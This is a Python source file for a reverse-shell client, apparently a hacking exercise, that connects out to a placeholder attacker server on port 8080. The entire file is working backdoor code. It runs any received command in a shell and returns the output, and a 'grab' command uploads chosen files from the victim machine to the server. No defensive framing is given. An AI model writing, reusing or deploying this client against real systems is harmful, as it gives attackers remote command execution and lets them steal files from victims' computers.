# TCP Client
import socket       
import subprocess
import os

class Client:
    ''' Target Client '''
    def __init__(self):
        self.SERVER_IP = '<SERVER-IP-ADDRESS>'
        self.SERVER_PORT = 8080

    def transfer(self, s, path):
        ''' send transfer file '''
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while packet != b'':
                s.send(packet) 
                packet = f.read(1024)
            s.send(b'DONE')
            f.close()
        else: 
            # the file doesn't exist
            s.send(b'Unable to find out the file')

    def connect(self): 
        ''' connect to server '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((self.SERVER_IP, self.SERVER_PORT)) # Here we define the server IP and the listening port

        # keep receiving commands from server
        while True: 
            # read the first KB of the tcp socket
            command = s.recv(1024).decode()         
            print(command)
            if 'terminate' in command:
                # if we got terminate order from server, 
                # close the socket and break the loop
                s.close()
                break 
            elif 'cd' in command:
                cur_path = os.getcwd()
                com, directory = command.split()
                new_path = f"{cur_path}\\{directory}"
                try: 
                    os.chdir(new_path)
                    s.send(f"[*] Current Path: {new_path}".encode())
                except Exception as e:
                    s.send(str(e).encode()) 
            elif 'grab' in command: 
                # if we received grab keyword from the attacker, then this is an indicator for
                # file transfer operation, hence we will split the received commands into two
                # parts, the second part which we intrested in contains the file path, so we will
                # store it into a variable called path and pass it to transfer function
                path = command.split()[-1]
                try: 
                    self.transfer(s, path)
                except Exception as e:
                    s.send(str(e).encode()) 
            else: 
                # otherwise, we pass the received command to a shell process
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(cmd.stdout.read()) # send back the result
                s.send(cmd.stdout.read()) # send back the error -if any-, such as syntax error

def main():
    c = Client()
    c.connect()

if __name__ == "__main__":
    main()